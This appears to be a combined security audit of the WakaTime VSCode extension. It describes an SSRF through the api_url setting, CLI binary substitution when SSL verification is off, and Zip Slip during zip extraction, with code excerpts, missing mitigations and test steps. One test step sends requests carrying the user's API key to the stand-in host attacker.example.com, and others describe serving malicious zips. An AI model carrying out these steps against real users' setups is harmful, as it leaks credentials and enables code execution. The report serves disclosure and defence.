### Combined Vulnerability List

This document outlines the identified vulnerabilities by combining and deduplicating the provided vulnerability lists.

#### 1. Server-Side Request Forgery (SSRF) in Web Extension

- **Vulnerability Name:** Server-Side Request Forgery (SSRF) in Web Extension
- **Description:**
    - An attacker can control the `api_url` setting of the WakaTime extension for VSCode Web.
    - The extension in web environment makes API requests using `fetch` to the configured `api_url`.
    - Without proper validation of the `api_url`, it leads to a Server-Side Request Forgery (SSRF) vulnerability.
    - An attacker can set the `api_url` to a malicious server, internal or external.
    - This causes the extension to make requests to that server.
    - This can be exploited to probe internal network resources or perform other malicious actions from the context of the VSCode web extension.
- **Impact:**
    - An attacker can use the VSCode web extension as a proxy to make requests to internal network resources or external servers.
    - This could lead to:
        - Information disclosure by accessing sensitive data on internal servers.
        - Internal network scanning to discover open ports and services.
        - Potential exploitation of vulnerabilities in internal services if they are reachable and exploitable through HTTP requests.
- **Vulnerability Rank:** high
- **Currently implemented mitigations:**
    - None. The `api_url` setting is directly used in `fetch` calls in `src/web/wakatime.ts` without any validation to prevent SSRF.
- **Missing mitigations:**
    - Input validation and sanitization for the `api_url` setting.
    - Implement a whitelist of allowed API domains or URL prefixes.
    - Validate that the provided API URL is a valid and expected WakaTime API endpoint.
    - Prevent users from setting arbitrary URLs for `api_url`.
- **Preconditions:**
    - The attacker needs to be able to configure the `api_url` setting of the WakaTime extension in VSCode Web. This can be done through VSCode settings UI.
    - The VSCode Web environment needs to have network access to the target internal or external resources that the attacker wants to reach.
- **Source code analysis:**
    - File: `/code/src/web/wakatime.ts`
    - Function: `getApiUrl()` retrieves the `api_url` from `this.config.get('wakatime.apiUrl')`.
    - This `api_url` is used in functions like `_sendHeartbeat`, `getCodingActivity`, and `updateTeamStatusBar` to construct URLs for `fetch` calls.
    - Example in `_sendHeartbeat`:
        ```typescript
        private async _sendHeartbeat(
            // ...
        ) {
            // ...
            const apiUrl = this.getApiUrl();
            const url = `${apiUrl}/users/current/heartbeats?api_key=${apiKey}`;
            // ...
            try {
                const response = await fetch(url, { // SSRF Vulnerability: `url` is attacker-controlled via `api_url` setting
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Machine-Name': vscode.env.appHost,
                    },
                    body: JSON.stringify(payload),
                });
                // ...
            } catch (ex) {
                // ...
            }
        }
        ```
    - No validation or sanitization of `apiUrl` before constructing the `url`.
- **Security test case:**
    - Step 1: Open VSCode in a web browser (e.g., vscode.dev).
    - Step 2: Install the WakaTime extension in the web VSCode.
    - Step 3: Open VSCode settings (File -> Preferences -> Settings).
    - Step 4: Search for "WakaTime Api Url".
    - Step 5: In the "WakaTime: Api Url" setting, enter a malicious URL, for example, `http://attacker.example.com`.
    - Step 6: Open any code file in VSCode editor and start editing it to trigger a heartbeat.
    - Step 7: Open browser's developer tools (Network tab).
    - Step 8: Verify that a network request (e.g., POST) is made to `http://attacker.example.com/users/current/heartbeats?api_key=YOUR_API_KEY`.
    - Step 9: On the attacker's server (`attacker.example.com`), set up a simple HTTP listener and verify that a request is received from the VSCode web extension. This confirms the SSRF vulnerability as the extension is making requests to the attacker-controlled `api_url`.

#### 2. Insecure SSL Certificate Verification Allowing CLI Binary Tampering

- **Vulnerability Name:** Insecure SSL Certificate Verification Allowing CLI Binary Tampering
- **Description:**
    - The extension performs its GitHub API calls and downloads of the wakatime‑cli zip file by honoring a user‑configured setting (`no_ssl_verify`).
    - When this setting is set to “true,” the HTTP options passed into the underlying request calls disable SSL certificate verification (by setting `strictSSL: false`).
    - This (optional) configuration lets an attacker with network control (for instance, on an open public network or via a compromised proxy) perform a man‑in-the-middle (MITM) attack.
    - The attacker could substitute a maliciously crafted zip file (and thus a malicious CLI binary) in place of the genuine one.
    - Later, when the extension calls the binary via a non-shell “execFile” call, the compromised CLI binary is executed—and arbitrary code on the host may run.
- **Impact:**
    - An attacker who can force the “no_ssl_verify” setting (or convince a user to enable it) and intercept HTTPS traffic could completely compromise the system.
    - The malicious binary could run with the privileges of the user running VS Code, leading to remote code execution, data exfiltration, or further system compromise.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - By default the extension uses HTTPS with SSL verification enabled; the “no_ssl_verify” setting is off unless manually overridden.
- **Missing Mitigations:**
    - There is no integrity or authenticity check (such as a secure hash or digital signature verification) on the downloaded binary.
    - The extension does not prevent a user or attacker from setting “no_ssl_verify” to “true” without warning or enforcing a stricter default.
- **Preconditions:**
    - The user’s configuration must have “no_ssl_verify” set to “true” (or an attacker must force such a setting via settings sync manipulation).
    - The attacker must have the ability to control or intercept network traffic (for example on an unencrypted or compromised WiFi network).
- **Source code analysis:**
    - In the `Dependencies` class (see functions such as `getLatestCliVersion()` and `downloadFile()`), the options object is modified so that if the setting read from configuration (`no_ssl_verify`) equals “true” then the property `strictSSL` is set to false.
    - This means that HTTPS requests (used both to query GitHub for the latest release and to download the CLI zip) will not validate the server’s certificate.
- **Security test case:**
    1. Manually (or via test automation) update the extension’s configuration to set `no_ssl_verify = true`.
    2. In a controlled test environment, intercept HTTPS requests to
        `https://github.com/wakatime/wakatime-cli/releases/latest/download` (and/or GitHub’s API URL) using a MITM proxy.
    3. Serve a zip file containing a modified (malicious) wakatime‑cli binary.
    4. Trigger an action in the extension that forces a CLI update (for instance by invoking a command that ultimately calls `checkAndInstallCli()`).
    5. Verify (by logging or monitoring process execution) that the malicious binary runs and that its payload executes.

#### 3. Zip Slip Vulnerability in Extraction of the Downloaded CLI Binary

- **Vulnerability Name:** Zip Slip Vulnerability in Extraction of the Downloaded CLI Binary
- **Description:**
    - When the extension downloads the wakatime‑cli zip file, it calls the `unzip()` helper in the `Dependencies` class.
    - This helper directly uses the “adm‑zip” library’s `extractAllTo()` method with the target directory set to the user’s `.wakatime` folder (or the extension folder as a fallback).
    - There is no validation or sanitization of file names within the zip archive.
    - If an attacker can supply a maliciously crafted zip (for example, by intercepting the download as described above) that contains file names with directory‑traversal components (e.g. entries starting with `../`), then the extraction process could write files outside the intended folder.
    - Such a “Zip Slip” vulnerability can allow overwriting of arbitrary files on disk.
- **Impact:**
    - An attacker who succeeds in injecting a zip archive with traversal entries may potentially overwrite sensitive system or user files.
    - This can lead to arbitrary file write and may culminate in remote code execution or further system compromise.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - There is no explicit check in the extraction routine to block file paths that escape the target directory.
- **Missing Mitigations:**
    - No sanitization or path‑validation is applied to zip archive entry names prior to extraction.
    - The extension lacks an integrity verification step for downloaded archives (for example, checking that no entry has a “../” path component).
- **Preconditions:**
    - Typically coupled with the “no_ssl_verify” vulnerability: if an attacker is able to control the downloaded zip (e.g. via a MITM attack when SSL verification is disabled), then the zip may contain malicious file paths.
- **Source code analysis:**
    - In the `Dependencies` class, the `unzip()` method uses:
        ```javascript
        let zip = new adm_zip(file);
        zip.extractAllTo(outputDir, true);
        ```
    - This code unconditionally extracts all files in the zip to the intended directory, without checking whether any file entry’s path escapes that directory.
- **Security test case:**
    1. In a test environment with “no_ssl_verify” enabled (to allow controlled interception), intercept the HTTPS download of the CLI zip file.
    2. Serve a specially crafted zip file in which at least one file entry has a relative path such as `../malicious.txt` or similar.
    3. Allow the extension’s CLI installation routine (triggered by e.g. `installCli()`) to run and extract the zip file.
    4. Verify that a file named “malicious.txt” is created outside the intended extraction directory—in a location of your choosing (for example, verify that a file is written to a temporary directory or even a system folder).
    5. Confirm that such an extraction would permit overwriting of sensitive files or execution of inserted code.